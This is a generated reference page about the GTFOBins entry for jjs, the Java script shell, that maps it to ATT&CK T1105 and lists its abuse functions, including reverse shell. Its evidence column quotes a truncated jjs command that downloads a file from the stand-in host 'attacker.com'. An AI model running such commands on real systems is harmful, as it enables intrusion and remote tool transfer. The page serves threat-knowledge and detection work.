---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# jjs

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `jjs` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/jjs` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for jjs covering download, file-read, file-write, reverse-shell, shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/jjs.md)
- Source verification: [source record](../../sources/gtfobins/jjs.md)

## Aliases

- `jjs`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: jjs var URL = Java.type('java.net.URL'); var ws = new URL('http://attacker.com/path/to/input-file'); var Channels = Java.type('java.nio.channels.Channels'); var rbc = Channels.n... |

## Source Verification

[source record](../../sources/gtfobins/jjs.md)

## Evidence Excerpt

```text
_body: ''
_name: jjs
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/jjs
comment: This tool is installed starting with Java SE 8.
functions:
download:
- code: 'jjs
var URL = Java.type(''java.net.URL'');
```
